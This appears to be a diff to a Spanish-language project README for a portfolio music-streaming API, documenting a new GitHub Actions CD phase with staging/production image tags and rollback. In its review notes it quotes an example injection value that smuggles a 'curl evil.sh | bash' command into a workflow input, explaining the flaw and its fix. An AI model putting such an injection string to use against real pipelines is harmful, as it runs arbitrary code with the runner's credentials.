@@ -513,14 +513,71 @@ compitan en la red (el servidor sella `updated_at` al RECIBIR, así que el orden
 del MISMO cliente**, que reenvía un cuerpo con posición ya vieja y sobreescribe con datos obsoletos
 un estado más fresco de otro dispositivo.
 
-13 tests en `tests/test_playback.py`: round-trip del servicio contra Redis real, `PUT` (éxito con
-`updated_at` del servidor, `404`/`409` según estado de la canción, `422` en `position_seconds`
-negativo/`device_id` vacío, `401`), `GET` (`404` sin estado previo, `200` con el último tras un
-`PUT`, `401`), el **escenario central de la fase** (dos "dispositivos" hacen `PUT` en secuencia, el
-segundo sobreescribe al primero, `GET` devuelve el del segundo — last-write-wins real de punta a
-punta vía HTTP), y aislamiento entre usuarios (propiedad opuesta a la de `GET /songs/popular`: cada
-uno ve solo lo suyo). Verificado también manualmente contra el stack dockerizado: dos `curl`
-simulando dispositivos distintos, `GET` final confirma el estado del segundo.
+14 tests en `tests/test_playback.py` (13 en la implementación inicial + 1 añadido en la revisión
+post-implementación): round-trip del servicio contra Redis real, `PUT` (éxito con `updated_at` del
+servidor, `404`/`409` según estado de la canción, `422` en `position_seconds` negativo/`device_id`
+vacío, `401`), un test que envía un `updated_at` falso en el body y confirma que el servidor lo
+ignora por completo (hallazgo de la revisión: el test original solo comprobaba que el campo
+existía, no que fuera realmente el del servidor), `GET` (`404` sin estado previo, `200` con el
+último tras un `PUT`, `401`), el **escenario central de la fase** (dos "dispositivos" hacen `PUT`
+en secuencia, el segundo sobreescribe al primero, `GET` devuelve el del segundo — last-write-wins
+real de punta a punta vía HTTP), y aislamiento entre usuarios (propiedad opuesta a la de `GET
+/songs/popular`: cada uno ve solo lo suyo). Verificado también manualmente contra el stack
+dockerizado: dos `curl` simulando dispositivos distintos, `GET` final confirma el estado del
+segundo.
+
+**Fase 14 — CD (staging/producción, rollback).** Reescrito por completo `.github/workflows/cd.yml`
+(placeholder vacío desde el scaffolding de Fase 0). **Sin servidor/VPS/cuenta de nube real**
+(decisión explícita del usuario) — "staging" y "producción" se modelan como dos TAGS de la misma
+imagen en GitHub Container Registry (ghcr.io, gratis, usa el `GITHUB_TOKEN` ya disponible, sin
+credenciales nuevas), no como entornos reales. `staging` se mueve automáticamente en cada push a
+`main` que pasa CI en verde (`workflow_run` sobre el workflow `CI`); `production` solo se mueve con
+una acción manual (`workflow_dispatch`, input `target_sha`). **Promover a producción y hacer
+rollback son la MISMA operación** (decisión de diseño deliberada): apuntar `production` a un SHA
+ya publicado, más nuevo (promoción) o más viejo (rollback) que el actual — forzar dos jobs
+distintos para la misma operación de registry habría sido artificial.
+
+**Hallazgo real y bloqueante de la revisión del plan, corregido antes de escribir código**:
+interpolar `${{ inputs.target_sha }}` directo dentro de un bloque `run:` de bash es inyección de
+comandos — GitHub Actions sustituye la expresión textualmente en el script ANTES de que bash lo
+ejecute, las comillas dobles no protegen. Un `target_sha` como `x"; curl evil.sh | bash; "`
+ejecutaría comandos arbitrarios con el token del runner (`packages: write`). Corregido pasando el
+input por `env:` (variable de entorno real, no texto sustituido) más una validación de formato
+(`^[0-9a-f]{7}$`) como defensa en profundidad adicional — dos revisores independientes confirmaron
+el mismo hallazgo de forma separada.
+
+Otros hallazgos de la revisión, todos incorporados: falta de `docker/setup-buildx-action` antes de
+`build-push-action` (la action oficial lo requiere/recomienda); falta de un guard de
+`concurrency:` (dos pushes seguidos a `main` podrían competir por el tag `staging`, mismo patrón ya
+usado en `ci.yml`); un comentario ancla en el propio `cd.yml` documentando que "CI success implica
+que el job `docker` de `ci.yml` también pasó" es una propiedad emergente de cómo está escrito hoy
+`ci.yml` (`docker` no tiene `if:` propio, solo `needs: test`), no algo que `cd.yml` fuerce por sí
+mismo — para que un cambio futuro en `ci.yml` no rompa esa garantía silenciosamente. Verificado
+también que es seguro hacer público el paquete: el `Dockerfile` nunca hace `COPY . .`, sin
+`ARG`/`ENV` con secretos horneados.
+
+**Corrección de método de verificación, encontrada en la revisión del plan**: la API REST de
+Packages de GitHub exige token incluso para paquetes públicos, a diferencia de la API de
+repos/Actions/PRs usada sin token en todas las fases anteriores — el método realmente sin-token
+para confirmar que un tag existe es `docker buildx imagetools inspect ghcr.io/<owner>/<repo>:<tag>`
+(pull anónimo contra el registry), y solo funciona después de que el usuario haga público el
+paquete la primera vez (paso manual, GHCR lo publica privado por defecto incluso en un repo
+público).
+
+`docker buildx imagetools create` (no un rebuild) para mover `production`: operación
+registry-a-registry que copia el manifest existente sin reconstruir ni resubir capas — promueve
+exactamente los mismos bytes ya probados en CI. `build-and-push` SÍ reconstruye la imagen (no
+reutiliza el artefacto exacto del job `docker` de `ci.yml` sobre el mismo commit) y NO repite su
+smoke test — simplificación aceptada y documentada, con la imagen base pinneada
+(`python:3.12.7-slim-bookworm`) el riesgo de deriva entre ambos builds es bajo, y reutilizar el
+artefacto exacto exigiría subir/bajar la imagen como artifact intermedio entre workflows.
+
+**Sobre el placeholder que fallaba en cada push (investigado, no resuelto de forma concluyente)**:
+el `cd.yml` original (`on: workflow_dispatch: {}`, sin jobs) aparecía como un "run" fallido en la
+API de GitHub Actions en cada push a `main` desde hacía varias fases, pese a no tener trigger
+`push` en ningún commit de su historia — sin logs autenticados (403 sin token) no fue posible
+determinar la causa exacta durante la planificación. Verificado tras el merge de esta fase si el
+comportamiento desapareció al darle contenido real (ver Riesgos conocidos).
 
 ## Diagrama de arquitectura
 
@@ -548,7 +605,7 @@ proyecto de portfolio).
 | 11   | Recomendaciones precalculadas (Celery)    | ✅ Implementado |
 | 12   | Caché de contenido popular                | ✅ Implementado |
 | 13   | Sincronización entre dispositivos         | ✅ Implementado |
-| 14   | CD                                        | ⬜ Pendiente    |
+| 14   | CD                                        | ✅ Implementado |
 | 15   | Documentación final                       | ⬜ Pendiente    |
 
 ## Decisiones técnicas
@@ -1094,6 +1151,52 @@ fase en que se toma. Por ahora, las de la Fase 1:_
   obsoletos un estado más fresco de otro dispositivo. Sin número de secuencia ni idempotency key
   para detectarlo — aceptado.
 
+**Fase 14 — CD (staging/producción, rollback)**
+
+- **Sin servidor/VPS/cuenta de nube real, decisión explícita del usuario**: "staging" y
+  "producción" son tags de la misma imagen en GHCR, no entornos reales. Publicar/versionar la
+  imagen es real y verificable sin coste; desplegarla a un servidor queda como diseño teórico
+  (ver "Cómo escalaría esto en producción real").
+- **GHCR, no Docker Hub**: cero cuentas nuevas, usa el `GITHUB_TOKEN` ya disponible en cada run de
+  Actions — Docker Hub habría exigido una cuenta y credenciales adicionales como secret, en
+  contradicción directa con el alcance confirmado por el usuario (nada nuevo que pagar/gestionar).
+- **`workflow_run` (no fusionar con `ci.yml`)**: separación de responsabilidades ya reflejada en la
+  existencia de dos archivos desde el scaffolding de Fase 0 — CI valida corrección, CD distribuye.
+  El filtro `branches: [main]` en `workflow_run` usa la rama del propio *run* de CI que lo disparó,
+  así que un CI de una PR de rama feature nunca dispara CD.
+- **Promover a producción y hacer rollback son la MISMA operación**: apuntar el tag `production` a
+  un SHA ya publicado — más nuevo es promoción, más viejo es rollback. Un único job
+  `set-production-tag`, no dos, evita duplicar código para la misma operación de registry con
+  distinto nombre según la dirección.
+- **Inyección de comandos vía `${{ inputs.target_sha }}`, encontrada y corregida en la revisión del
+  plan (severidad alta, confirmada por dos revisores independientes)**: interpolar una expresión de
+  GitHub Actions directo dentro de un bloque `run:` de bash es sustitución de TEXTO antes de la
+  ejecución, no una variable de shell protegida por comillas — un `target_sha` malicioso podría
+  ejecutar comandos arbitrarios con el token del runner (`packages: write`). Corregido pasando el
+  input por `env:` (variable de entorno real) más una validación de formato
+  (`^[0-9a-f]{7}$`) como defensa en profundidad adicional.
+- **`docker buildx imagetools create`, no un rebuild, para mover `production`**: operación
+  registry-a-registry (copia el manifest existente) que promueve exactamente los mismos bytes ya
+  probados en CI — evita la clase de bug "funcionó en staging pero el build de producción salió
+  distinto". Se verifica primero con `imagetools inspect` que el SHA objetivo exista de verdad,
+  para fallar alto y claro en vez de crear un tag `production` roto silenciosamente.
+- **`build-and-push` reconstruye la imagen y no repite el smoke test de `ci.yml`**: simplificación
+  aceptada y documentada — dos builds separados del mismo commit con la imagen base pinneada
+  (`python:3.12.7-slim-bookworm`) tienen bajo riesgo de deriva; reutilizar el artefacto exacto de
+  CI exigiría subir/bajar la imagen como artifact intermedio entre workflows, complejidad no
+  proporcional al alcance de esta fase.
+- **Dependencia implícita entre "CI success" y "el job `docker` de `ci.yml` también pasó"**:
+  documentada con un comentario ancla en el propio `cd.yml` (hallazgo de la revisión del plan) — es
+  cierto hoy porque `docker` no tiene `if:` propio, solo `needs: test`, pero es una propiedad
+  emergente de `ci.yml`, no algo que `cd.yml` fuerce por sí mismo.
+- **Visibilidad del paquete GHCR**: nace privado por defecto incluso en un repo público — paso
+  manual único del usuario para hacerlo público, verificado como seguro (`Dockerfile` sin `COPY .
+  .`, sin secretos horneados, `.env` ya excluido en `.dockerignore`).
+- **Verificación sin token usa `docker buildx imagetools inspect`, no la API REST de Packages**
+  (corrección de método encontrada en la revisión del plan): esa API exige token incluso para
+  paquetes públicos, a diferencia de la API de repos/Actions/PRs ya usada sin token en fases
+  anteriores.
+
 ## Riesgos conocidos
 
 - ~~Desalineación de versión de Python~~ — **verificado en Fase 5, sin problemas reales**: el
@@ -1147,9 +1250,10 @@ fase en que se toma. Por ahora, las de la Fase 1:_
   `alembic upgrade head` de forma concurrente — Alembic no tiene locking distribuido incorporado.
   Aceptado mientras esta fase no levante réplicas reales; a resolver si/cuando la Fase 14 (CD) las
   introduzca (mover la migración a un job/init-container separado).
-- **La imagen Docker todavía no se publica en ningún registry** (Fase 7): solo se construye
-  localmente/en CI como smoke test, nunca se hace `docker push`. Publicar y versionar la imagen es
-  explícitamente Fase 14 (CD).
+- ~~La imagen Docker todavía no se publica en ningún registry~~ — **resuelto en Fase 14**: cada
+  push a `main` que pasa CI publica la imagen versionada (tag `sha-<corto>` + `staging`) en GitHub
+  Container Registry; `production` se promueve/revierte manualmente. Sin servidor real que la
+  consuma (decisión explícita, ver esa sección) — publicación y versionado sí son reales.
 - **Un único contenedor de la API, sin réplicas reales** (Fase 7): el diseño multi-réplica que ya
   asumía el rate limiter con Redis (Fase 6, justificación de "por qué Redis y no memoria local")
   sigue siendo teórico hasta que haya un balanceador delante — sin fase de proxy/CDN todavía
@@ -1267,8 +1371,42 @@ fase en que se toma. Por ahora, las de la Fase 1:_
 - **Sin gestión de dispositivos** (Fase 13): `device_id` es un string libre sin registro previo, sin
   límite de cuántos `device_id` distintos puede usar un usuario, sin listado de dispositivos activos
   ni revocación. Fuera de alcance de esta fase.
+- **Sin servidor/entorno real que consuma los tags publicados** (Fase 14): "staging"/"producción"
+  son tags de imagen, no infraestructura desplegada — decisión explícita del usuario, sin cuenta de
+  nube disponible. Documentado como diseño teórico en "Cómo escalaría esto en producción real".
+- **`build-and-push` reconstruye en vez de reutilizar el artefacto exacto de CI** (Fase 14): dos
+  builds separados del mismo commit — con la imagen base pinneada el riesgo de deriva es bajo, pero
+  no es imposible (ej. un paquete del sistema operativo cambiando de versión entre ambos builds si
+  el mirror de Debian se actualiza justo en medio). Aceptado, no resuelto.
+- **`workflow_run` con `types: [completed]` genera un run "vacío" en CD si CI falla** (Fase 14):
+  ningún job de `cd.yml` matchea su `if:` en ese caso, así que el run aparece sin ningún job
+  ejecutado en la pestaña Actions — ruido cosmético aceptado, no se añadió un job "no-op" solo para
+  evitarlo.
+- **Sin protección contra que un colaborador con permiso de escritura dispare `workflow_dispatch`
+  con un `target_sha` que apunte a un commit problemático** (Fase 14): la validación solo comprueba
+  formato (7 hex) y que el tag exista en el registry, no ninguna política de "qué SHAs son
+  promovibles" — cualquier build ya publicado en `sha-<...>` puede convertirse en `production`. Sin
+  aprobaciones ni environments protegidos de GitHub configurados. Aceptado para el alcance de un
+  portfolio de un único mantenedor.
+- **Placeholder `cd.yml` fallando en cada push (investigado durante la planificación, ver Resumen)**:
+  causa exacta no determinada sin logs autenticados — a confirmar empíricamente si el comportamiento
+  desaparece tras darle contenido real a `cd.yml`, o si persiste y requiere investigación adicional.
 
 ## Cómo escalaría esto en producción real
 
 _Pendiente — sección dedicada en la Fase 15 (CDN, réplicas geográficas, Cassandra para estado de
-reproducción, etc.), con notas parciales añadidas en las fases que las motivan (9, 12, 13)._
+reproducción, etc.), con notas parciales añadidas en las fases que las motivan (9, 12, 13, 14)._
+
+**Despliegue real (Fase 14, diseño teórico, no implementado)**: sin servidor real disponible, lo
+que un pipeline de CD completo haría después de que `cd.yml` mueva el tag `production` en GHCR es
+notificar a un sistema externo que ya observa ese tag — por ejemplo Watchtower o un webhook simple
+en el propio servidor que hace `docker pull` + `docker compose up -d` al detectar un tag nuevo, o
+un operador tipo ArgoCD/Flux si el destino fuera Kubernetes. Con un único servidor (el caso más
+realista para el presupuesto de un portfolio, un VPS pequeño) el patrón más simple y razonable
+sería: el propio servidor corre un cliente ligero (`watchtower` apuntando a
+`ghcr.io/.../repo:production` con polling cada N minutos, o un webhook que reciba una notificación
+de GitHub Actions) que hace el `pull`+restart — sin necesidad de que el servidor exponga ningún
+puerto SSH al pipeline de CI/CD, reduciendo la superficie de ataque (el servidor "tira" del cambio
+en vez de que CI/CD "empuje" credenciales SSH hacia él). Rollback en ese modelo es exactamente la
+misma operación ya implementada en `cd.yml` (mover `production` a un SHA anterior) — el servidor lo
+recogería en el siguiente poll sin ningún cambio adicional.
